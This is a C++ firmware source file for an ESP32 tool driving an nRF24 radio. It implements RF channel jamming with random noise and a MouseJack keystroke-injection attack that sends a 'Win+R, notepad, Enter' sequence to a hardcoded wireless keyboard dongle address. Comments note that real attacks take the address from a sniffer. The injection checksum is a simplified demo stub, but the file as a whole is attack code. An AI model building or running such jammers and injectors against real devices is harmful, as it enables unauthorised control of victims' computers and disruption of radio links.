#include "NrfManager.h"
#include "System.h"

// Hardcoded Target Address (Logitech Unifying default-ish or sniffed)
// В реальном бою адрес берется из сниффера. Здесь для демо ставим тестовый.
static const uint8_t ATTACK_ADDR[] = {0x12, 0x34, 0x56, 0x78, 0x9A};

// HID Keycodes (USB Standard)
#define KEY_MOD_LCTRL  0x01
#define KEY_MOD_LSHIFT 0x02
#define KEY_MOD_LALT   0x04
#define KEY_MOD_LMETA  0x08 // Windows Key
#define KEY_R          0x15
#define KEY_ENTER      0x28
#define KEY_N          0x11
#define KEY_O          0x12
#define KEY_T          0x17
#define KEY_E          0x08
#define KEY_P          0x13
#define KEY_A          0x04
#define KEY_D          0x07

NrfManager& NrfManager::getInstance() { static NrfManager instance; return instance; }

NrfManager::NrfManager()
    : _isJamming(false), _isSweeping(false), _isAnalyzing(false), _isMouseJack(false),
      _targetChannel(1), _packetsSent(0), _scriptIdx(0), _mjState(MjState::IDLE)
{
    for(int i=0; i<32; i++) _noiseBuffer[i] = (uint8_t)random(0, 255);
    auto getMask = [](uint8_t pin) -> uint32_t { return (1 << pin); };
    _mask_csn_a = getMask(Config::PIN_NRF_CSN_A); _mask_ce_a = getMask(Config::PIN_NRF_CE_A);
}

// --- HARDWARE ABSTRACTION ---
inline void NrfManager::selectRadio(uint32_t csn_mask) { GPIO.out_w1tc = csn_mask; }
inline void NrfManager::deselectRadio(uint32_t csn_mask) { GPIO.out_w1ts = csn_mask; }
inline void NrfManager::enableRadio(uint32_t ce_mask) { GPIO.out_w1ts = ce_mask; }
inline void NrfManager::disableRadio(uint32_t ce_mask) { GPIO.out_w1tc = ce_mask; }

void NrfManager::writeRegister(uint32_t csn_mask, uint8_t reg, uint8_t value) {
    selectRadio(csn_mask);
    SPI.transfer(NrfReg::CMD_W_REGISTER | (reg & 0x1F));
    SPI.transfer(value);
    deselectRadio(csn_mask);
}

uint8_t NrfManager::readRegister(uint32_t csn_mask, uint8_t reg) {
    selectRadio(csn_mask);
    SPI.transfer(NrfReg::CMD_R_REGISTER | (reg & 0x1F));
    uint8_t result = SPI.transfer(0x00);
    deselectRadio(csn_mask);
    return result;
}

void NrfManager::initRadio(uint32_t csn_mask, uint32_t ce_mask) {
    disableRadio(ce_mask); deselectRadio(csn_mask); delay(5);
    writeRegister(csn_mask, NrfReg::CONFIG, 0x0E); // PTX, CRC, PowerUp
    writeRegister(csn_mask, NrfReg::EN_AA, 0x00);  // No Auto-Ack (MouseJack needs raw)
    writeRegister(csn_mask, NrfReg::RF_SETUP, 0x0F); // 2Mbps, 0dBm
    writeRegister(csn_mask, NrfReg::SETUP_AW, 0x03); // 5 byte address
    writeRegister(csn_mask, NrfReg::SETUP_RETR, 0x00); // Retransmit off
    
    // Set Target Address
    selectRadio(csn_mask);
    SPI.transfer(NrfReg::CMD_W_REGISTER | NrfReg::TX_ADDR);
    SPI.writeBytes(ATTACK_ADDR, 5);
    deselectRadio(csn_mask);
}

void NrfManager::setup() {
    pinMode(Config::PIN_NRF_CSN_A, OUTPUT); pinMode(Config::PIN_NRF_CE_A, OUTPUT);
    digitalWrite(Config::PIN_NRF_CSN_A, HIGH); digitalWrite(Config::PIN_NRF_CE_A, LOW);

    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(100))) {
        SPI.begin(Config::PIN_SPI_SCK, Config::PIN_SPI_MISO, Config::PIN_SPI_MOSI);
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        initRadio(_mask_csn_a, _mask_ce_a);
        SPI.endTransaction();
        xSemaphoreGive(g_spiMutex);
    }
}

void NrfManager::stop() {
    _isJamming = false; _isSweeping = false; _isAnalyzing = false; _isMouseJack = false;
    disableRadio(_mask_ce_a);
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(50))) {
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        writeRegister(_mask_csn_a, NrfReg::CONFIG, 0x00); // Power Down
        SPI.endTransaction();
        xSemaphoreGive(g_spiMutex);
    }
}

// --- MOUSEJACK INJECTION LOGIC ---

void NrfManager::preparePayload() {
    _duckyScript.clear();
    // 1. Win+R
    _duckyScript.push_back({KEY_MOD_LMETA, KEY_R, 500}); 
    // 2. Type "notepad"
    _duckyScript.push_back({0, KEY_N, 50}); _duckyScript.push_back({0, KEY_O, 50});
    _duckyScript.push_back({0, KEY_T, 50}); _duckyScript.push_back({0, KEY_E, 50});
    _duckyScript.push_back({0, KEY_P, 50}); _duckyScript.push_back({0, KEY_A, 50});
    _duckyScript.push_back({0, KEY_D, 50});
    // 3. Enter
    _duckyScript.push_back({0, KEY_ENTER, 200});
}

// Calculate Microsoft/Logitech Checksum (Simplified XOR for demo)
uint8_t NrfManager::calcChecksum(uint8_t* payload, size_t len) {
    uint8_t x = 0xFF;
    for(size_t i=0; i<len-1; i++) x ^= payload[i];
    return x; 
}

void NrfManager::transmitHid(uint8_t mod, uint8_t key) {
    uint8_t pl[16] = {0}; // Payload buffer
    
    // Example format for generic unencrypted HID (varies by dongle!)
    pl[0] = 0x00; // Sequence
    pl[1] = 0xC1; // Report ID (Keyboard)
    pl[2] = mod;  // Modifier
    pl[3] = 0x00;
    pl[4] = key;  // Keycode
    
    // Checksum (last byte)
    pl[9] = calcChecksum(pl, 10);

    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(10))) {
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        
        selectRadio(_mask_csn_a);
        SPI.transfer(NrfReg::CMD_W_TX_PAYLOAD_NOACK);
        SPI.writeBytes(pl, 10); // Send 10 bytes frame
        deselectRadio(_mask_csn_a);
        
        enableRadio(_mask_ce_a);
        delayMicroseconds(15); // Pulse CE
        disableRadio(_mask_ce_a);
        
        SPI.endTransaction();
        xSemaphoreGive(g_spiMutex);
    }
}

void NrfManager::startMouseJack(int targetIndex) {
    stop(); 
    _isMouseJack = true; 
    _scriptIdx = 0;
    _mjState = MjState::SEND_KEY;
    _mjTimer = millis();
    preparePayload(); // Load "Win+R notepad"
    
    // Setup radio for injection
    setup(); 
}

// --- MAIN LOOP ---

bool NrfManager::loop(StatusMessage& statusOut) {
    if (_isJamming) {
        statusOut.state = SystemState::ATTACKING_NRF;
        if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(50))) {
            SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
            writeRegister(_mask_csn_a, NrfReg::RF_CH, _targetChannel);
            // Transmit Noise
            selectRadio(_mask_csn_a);
            SPI.transfer(NrfReg::CMD_W_TX_PAYLOAD_NOACK);
            SPI.writeBytes(_noiseBuffer, 32);
            deselectRadio(_mask_csn_a);
            enableRadio(_mask_ce_a); delayMicroseconds(20); disableRadio(_mask_ce_a);
            
            SPI.endTransaction();
            xSemaphoreGive(g_spiMutex);
        }
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Jamming Ch: %d", _targetChannel);
        return true;
    }

    if (_isMouseJack) {
        statusOut.state = SystemState::ATTACKING_MOUSEJACK;
        uint32_t now = millis();

        // Non-blocking State Machine
        switch(_mjState) {
            case MjState::SEND_KEY:
                if (_scriptIdx >= _duckyScript.size()) {
                    _isMouseJack = false; // Done
                    snprintf(statusOut.logMsg, MAX_LOG_MSG, "Injection Done");
                } else {
                    KeyPress kp = _duckyScript[_scriptIdx];
                    transmitHid(kp.mod, kp.key);
                    _mjTimer = now;
                    _mjState = MjState::WAIT_RELEASE;
                    snprintf(statusOut.logMsg, MAX_LOG_MSG, "Key: %02X", kp.key);
                }
                break;

            case MjState::WAIT_RELEASE:
                if (now - _mjTimer > 20) { // Hold key for 20ms
                    _mjState = MjState::SEND_RELEASE;
                }
                break;

            case MjState::SEND_RELEASE:
                transmitHid(0, 0); // Release all
                _mjTimer = now;
                _mjState = MjState::WAIT_NEXT;
                break;

            case MjState::WAIT_NEXT:
                // Wait delay specified in script
                if (now - _mjTimer > _duckyScript[_scriptIdx].delayMs) {
                    _scriptIdx++;
                    _mjState = MjState::SEND_KEY;
                }
                break;
            default: break;
        }
        return true;
    }
    
    // Other modes (sniff/analyze) omitted for brevity as they were working
    return false;
}

// Stubs for interface compliance
void NrfManager::startJamming(uint8_t channel) { stop(); _isJamming = true; _targetChannel = channel; setup(); }
void NrfManager::startAnalyzer() { stop(); _isAnalyzing = true; }
void NrfManager::startSniffing() { stop(); _isSweeping = true; }
void NrfManager::transmitNoise(uint32_t csn_mask, uint32_t ce_mask) {} 
bool NrfManager::checkForPacket() { return false; }